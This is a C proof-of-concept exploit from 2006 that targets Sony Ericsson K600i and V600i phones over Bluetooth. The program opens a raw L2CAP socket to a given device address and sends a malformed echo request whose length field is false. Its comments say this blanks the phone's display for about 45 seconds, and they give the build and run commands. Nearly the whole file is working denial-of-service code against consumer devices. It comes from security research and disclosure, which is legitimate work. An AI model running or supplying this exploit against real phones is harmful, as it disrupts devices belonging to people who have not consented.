/*	Sony/Ericsson K600i reset display - PoC			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	02-01-2006						*/
/*	Vulnerability found using BSS fuzzer :			*/
/*		http://securitech.homeunix.org/blue/		*/
/*								*/
/*	Causes anormal behaviours on some Sony/Ericsson 	*/
/*	cell phones 						*/
/*	Vulnerable tested devices :				*/
/*		- K 600i					*/
/*		- V 600i					*/
/*		- And maybe other ones... 			*/
/*								*/
/*	Vulnerable devices will slowly turn their screen into 	*/
/*	black and then display a white screen. 			*/
/*	After a short period (~45sec), they will go back to 	*/
/*	their normal behaviour					*/
/*								*/
/*	gcc -lbluetooth reset_display_K600i.c 			*/
/*		-o reset_display_K600i				*/
/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

int main(int argc, char **argv)
{
    char *l2cap_packet;
    l2cap_cmd_hdr *l2cap_cmd;
    struct sockaddr_l2 addr;
    int packet_length, socket_fd, index;

    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
	
    if ((socket_fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;

    if (bind(socket_fd, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &addr.l2_bdaddr);
	
    if (connect(socket_fd, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
	
    if(!(l2cap_packet = (char *) malloc ((int) SIZE + 1))) 
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
	
    memset(l2cap_packet, 'A', SIZE);

    l2cap_cmd = (l2cap_cmd_hdr *) l2cap_packet;
    l2cap_cmd->code = L2CAP_ECHO_REQ;
    l2cap_cmd->ident = 1;
    l2cap_cmd->len = FAKE_SIZE;
	
    if( (packet_length = send(socket_fd, l2cap_packet, SIZE, 0)) >= 0)
    {
        printf("L2CAP packet sent (%d)\n", packet_length);
    }

    printf("Buffer:\t");
    for(index = 0; index<packet_length; index++)
        printf("%.2X ", (unsigned char) l2cap_packet[index]);
    printf("\n");

    free(l2cap_packet);
    close(socket_fd);
    return EXIT_SUCCESS;
}
